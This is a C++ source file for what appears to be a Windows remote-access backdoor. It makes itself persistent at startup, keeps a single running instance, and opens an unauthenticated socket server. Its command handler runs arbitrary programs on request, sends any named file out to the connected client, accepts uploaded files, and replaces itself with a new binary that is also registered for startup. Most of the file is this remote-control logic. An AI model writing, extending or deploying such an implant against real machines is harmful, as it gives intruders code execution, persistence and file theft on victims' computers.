#include "Main.h"
#include <vcruntime.h>
#include <vector>
#include <Msi.h>
#include "Utils.h"

#include <locale>

// Link with ws2_32.lib
#pragma comment(lib, "Ws2_32.lib")


constexpr int FILE_NOT_FOUND_ERRORNO = 2;
constexpr char ERROR_MSG[] = "Unknown Command";
constexpr char INVALID_ARGS_MSG[] = "Invalid Args";
constexpr char INVALID_HASH_MSG[] = "Invalid Hash";
constexpr char PING_COMMAND[] = "ping";
constexpr char PONG_COMMAND[] = "pong";
constexpr char RUN_COMMAND[] = "run";
constexpr char OK_COMMAND[] = "ok";
constexpr char UPLOAD_COMMAND[] = "upload";
constexpr char DOWNLOAD_COMMAND[] = "download";
constexpr char UPDATE_COMMAND[] = "update";

constexpr DWORD SLEEP_TIME = 1 * 1000 * 60 * 60;


WinapiException::WinapiException(const char* lastFunc, WinapiErrornoMethod error) : m_lastFunc(lastFunc) {
    switch (error) {
    case WinapiErrornoMethod::standardError:
        m_errorno = GetLastError();
        break;
    case WinapiErrornoMethod::wsaError:
        m_errorno = WSAGetLastError();
        break;
    default:
        m_errorno = 0;
        break;
    }
}

WinapiException::WinapiException(const char* lastFunc, int errorno) : m_lastFunc(lastFunc), m_errorno(errorno) {
    // blank
}


int WinapiException::getErrorno() {
    return m_errorno;
}

const char* WinapiException::getLastFunc() {
    return m_lastFunc;
}




std::pair<std::string, std::vector<std::string>> parseCommand(std::string msg) {
    std::vector<std::string> splitted;
    size_t pos = 0;
    while ((pos = msg.find(' ')) != std::string::npos) {
        std::string token = msg.substr(0, pos);
        if (!token.empty()) {
            splitted.push_back(token);
        }
        msg.erase(0, pos + 1);
    }
    if (!msg.empty()) {
        splitted.push_back(msg);
    }
    if (splitted.empty()) {
        throw ClientException::invalidMsg;
    }
    std::string command = splitted[0];
    splitted.erase(splitted.begin());
    return {command, splitted};
}

std::string join(const std::vector<std::string>& vec, const std::string& delimiter) {
    std::string result;
    for (size_t i = 0; i < vec.size(); ++i) {
        result += vec[i];
        if (i < vec.size() - 1) {
            result += delimiter;
        }
    }
    return result;
}

void runPath(std::string path) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    char* cpath = new char[path.length() + 1];
    strcpy_s(cpath, path.length()+1, path.c_str());
    BOOL suc = CreateProcessA(NULL,  // module name 
                   cpath, // Command line
                   NULL,  // Process handle not inheritable
                   NULL,  // Thread handle not inheritable
                   FALSE, // Set handle inheritance to FALSE
                   0,     // No creation flags
                   NULL,  // Use parent's environment block
                   NULL,  // Use parent's starting directory
                   &si,   // Pointer to STARTUPINFO structure
                   &pi    // Pointer to PROCESS_INFORMATION structure
    );
    delete[] cpath;
    if (!suc) {
        throw WinapiException("CreateProcess",
                              WinapiErrornoMethod::standardError);
    }
    Handle hProcess(pi.hProcess);
    Handle hThread(pi.hThread);

    DWORD waitStatus = WaitForSingleObject(hProcess.getHandle(), INFINITE);
    if (waitStatus != WAIT_OBJECT_0) {
        throw WinapiException("WaitForSingleObject",
                              WinapiErrornoMethod::standardError);
    }
}

void handleMsg(ClientSocket& client, const std::string& msg) {
    openMessageBox(msg.c_str());
    auto p = parseCommand(msg);
    std::string command = p.first;
    auto args = p.second;
    if (command == PING_COMMAND) {
        client.sendMsg(PONG_COMMAND);
    } else if (command == RUN_COMMAND) {
        if (args.size() < 1) {
            throw ClientException::invalidArgs;
        }
        try {
            runPath(join(args, " "));
        }
        catch (WinapiException &e) {
            if (e.getErrorno() == 2) {
                throw ClientException::invalidArgs;
            }
            throw e;
        }
        client.sendMsg(OK_COMMAND);
    } else if (command == UPLOAD_COMMAND) {
        std::string fileName = client.recvFile();
        client.validateFileHash(fileName);
        client.sendMsg(OK_COMMAND);
    } else if (command == DOWNLOAD_COMMAND) {
        if (args.size() != 1) {
            throw ClientException::invalidArgs;
        }
        try {
            client.sendFile(args[0]);
            client.sendHash(args[0]);
        }
        catch (WinapiException & e) {
            if (e.getErrorno() == FILE_NOT_FOUND_ERRORNO) {
                throw ClientException::invalidArgs;
            }
            throw e;
        }
        client.sendMsg(OK_COMMAND);
    } else if (command == UPDATE_COMMAND) {
        std::string fileName = client.recvFile();
        client.validateFileHash(fileName);
        char absFileName[MAX_PATH];
        GetFullPathNameA(fileName.c_str(), MAX_PATH, absFileName, NULL);
        runOnStartUp(absFileName);
        client.sendMsg(OK_COMMAND);
    }
    else {
        throw ClientException::invalidMsg;
    }
}

void handleClient(ClientSocket& client) {
    BOOL client_connected = TRUE;
    while (client_connected) {
        try {
            std::string msg = client.recvMsg();
            handleMsg(client, msg);
        }
        catch (ClientException e) {
            switch (e) {
            case ClientException::invalidMsg:
                client.sendMsg(ERROR_MSG);
                break;
            case ClientException::ClientDisconnected:
                client_connected = FALSE;
                break;
            case ClientException::invalidArgs:
                client.sendMsg(INVALID_ARGS_MSG);
                break;
            case ClientException::hashDidNotMatch:
                client.sendMsg(INVALID_HASH_MSG);
                break;
            default:
                break;
            }
        }
    }
    
}

void startServer() {

    ServerSocket serverSock;
    serverSock.bind();
    serverSock.listen();
    while (TRUE) {
        ClientSocket client = serverSock.accept();
        handleClient(client);
    }
}

int main() {
    try {
        Mutex mutex = ensureOneProgram();
        runOnStartUp();
        //openMessageBox();
        startServer();
    } catch (WinapiException& e) {
        std::cout << "error number " << e.getErrorno() << " in "
                  << e.getLastFunc() << "\n";
    } catch (const std::exception& e) {
        std::cout << "Unknown exception: " << e.what() << "\n";
    } catch (...) {
        std::cout << "Unknown exception\n";
    }

    WSACleanup();
}

